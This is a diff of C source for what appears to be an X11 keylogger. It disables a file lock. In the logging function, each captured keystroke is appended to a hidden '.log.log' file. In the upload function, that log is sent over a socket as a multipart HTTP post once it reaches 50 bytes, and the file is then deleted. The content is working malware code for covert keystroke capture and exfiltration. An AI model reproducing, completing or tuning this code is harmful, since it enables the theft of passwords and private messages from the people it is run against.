@@ -13,7 +13,7 @@
 #include <arpa/inet.h>
 #include <X11/keysym.h>
 
-int lock = 0;
+//int lock = 0;
 
 int bit(unsigned char i) 
 {
@@ -99,16 +99,16 @@ void logfile (char ch)
 {
 	FILE 	*file;
 
-	while (lock) sleep(100);
+	//while (lock) sleep(100);
 	if (ch != '\0') {
 		if((file = fopen(".log.log", "a+")) != NULL)
 		{
-		  	lock = 1;
+		  	//lock = 1;
 		  	fputc(ch, file);
 		  	fclose(file);
 		}
 	}
-	lock = 0;
+	//lock = 0;
 }
 
 
@@ -154,12 +154,13 @@ void upload()
 
     char 		endbuf[]   = "\r\n--1727381797619608628249622620--";
 
-    if((file = fopen(".log1.log", "r")) != NULL) {
-    	lock = 1;
+    if((file = fopen(".log.log", "r")) != NULL) {
+    	//lock = 1;
         fseek(file, 0L, SEEK_END);
         fsize = ftell(file);
 
-        if (fsize < 512) {
+        if (fsize < 50) {
+        	//lock = 0;
         	fclose(file);
         	return;
         }
@@ -186,7 +187,7 @@ void upload()
         send(socket, endbuf, sizeof(endbuf), 0);
         fclose(file);
         remove(".log.log");
-        lock = 0;
+         //lock = 0;
         read(socket, buf, sizeof(buf)-1);
     }
 }
